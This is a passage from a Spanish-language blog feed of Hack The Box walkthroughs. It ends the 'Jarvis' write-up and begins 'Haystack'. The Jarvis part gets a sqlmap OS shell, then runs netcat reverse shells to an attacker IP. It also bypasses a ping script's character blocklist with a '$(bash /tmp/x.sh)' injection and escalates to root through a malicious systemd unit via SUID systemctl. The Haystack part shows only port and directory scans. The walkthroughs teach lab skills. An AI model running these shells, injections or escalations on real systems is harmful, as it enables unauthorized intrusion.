&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.10.143/room.php?cod=1&amp;#34;&lt;/span&gt; --dbs --batch

available databases &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;7&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:                                                                                                                              
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; etgkt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; hotel
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; information_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mysql
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; performance_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; secret
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;sqlmap---os-shell&#34;&gt;SQLMAP - OS-SHELL&lt;/h3&gt;
&lt;p&gt;Utilizamos el parametro de sqlmap que nos devuelve una shell, en la cual podemos ejecutar comandos del sistema.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.10.143/room.php?cod=1&amp;#34;&lt;/span&gt; --os-shell
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Obtenemos una shell con el usuario www-data:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2015.55.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener una shell inversa creamos un archivo llamado shell.sh, configuramos un servidor con python y con la shell de sqlmap descargamos el archivo y lo ejecutamos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rm /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;nc 10.10.14.174 &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt; &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2017.36.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Shell inversa:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2017.36.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---pepper&#34;&gt;Shell - Pepper&lt;/h2&gt;
&lt;p&gt;Enumeramos un poco el sistema y encontramos un script con el comando &lt;code&gt;sudo -l -l&lt;/code&gt;, dicho archivo puede ser ejecutado por cualquier usuario con el comando &lt;code&gt;sudo -u pepper ./simpler.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2017.50.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al analizar el codigo del archivo encontramos que al pasarle el parametro &amp;lsquo;-p&amp;rsquo; este ejecuta un ping sobre una IP que se le pasa, pero en la funcion no nos permite ejecutar un comando extra ademas de la IP que se le pasa.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;exec_ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;forbidden&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,]&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Enter an IP: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;forbidden&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Got you&amp;#39;&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ping &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para poder escapar los caracteres &lt;code&gt;&amp;amp;,;,-,``,||,|&lt;/code&gt; vamos a utilizar una &lt;strong&gt;variable&lt;/strong&gt; la cual va ejecutar nuestra shell inversa, esta ultima la creamos en el directorio &lt;code&gt;/tmp&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -e /bin/bash 10.10.14.174 &lt;span class=&#34;m&#34;&gt;8989&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para obtener una shell con el usuario Pepper utilizamos los siguientes comandos, Ejecucion del script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Parametro cuando nos lo pida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;bash /tmp/x.sh&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2019.22.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell inversa y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2019.22.56.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que tenemos acceso al usuario Pepper agregamos nuestra llave publica a &lt;code&gt;authorized_keys&lt;/code&gt; para poder ingresar mediante el servicio ssh.&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion de los archivos SUID en la maquina y encontramos &lt;code&gt;/bin/systemctl&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2021.30.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la informacion que nos proporciona &lt;a href=&#34;https://gtfobins.github.io/gtfobins/systemctl/&#34;&gt;&lt;strong&gt;GTFObins&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Utilizamos los comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TF&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/tmp/priv.service&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[Service]&amp;#39;&lt;/span&gt; &amp;gt; &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Type=oneshot&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ExecStart=/bin/sh -c &amp;#34;nc -e /bin/bash 10.10.14.174 1331&amp;#34;&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[Install]&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;WantedBy=multi-user.target&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;systemctl link &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now &lt;span class=&#34;nv&#34;&gt;$TF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2021.23.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell como usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2021.24.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/jarvis/Screenshot%20from%202019-07-25%2021.25.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/jarvis/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/jarvis/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Haystack</title>
        <link>https://sckull.github.io/posts/haystack/</link>
        <pubDate>Sat, 02 Nov 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 Nov 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/haystack/</guid>
        <description>Haystack es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Haystack es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Haystack&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.115&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/32897&#34;&gt;JoyDragon&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP##&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y su servicio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.115 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun1

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-06-30 00:02:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.115                                    
Discovered open port 80/tcp on 10.10.10.115
Discovered open port 9200/tcp on 10.10.10.115

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Sat Jun 29 21:50:27 2019 as: nmap -sV -sC -p 9200,22,80 -o nmap.scan -e tun1 10.10.10.115&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.115
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    nginx 1.12.2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have a title (text/html).
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;9200/tcp open  http    nginx 1.12.2
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;| http-methods: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_  Potentially risky methods: DELETE
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_http-server-header: nginx/1.12.2
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|_http-title: Site doesn&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;application/json&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 29 21:51:09 2019 -- 1 IP address (1 host up) scanned in 42.27 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster---puerto-80&#34;&gt;GOBUSTER - Puerto 80&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de directorios y archivos en el puerto 80 http con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115/ -w /usr/share/wordlists/dirb/common.txt -np -x php,txt,html -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
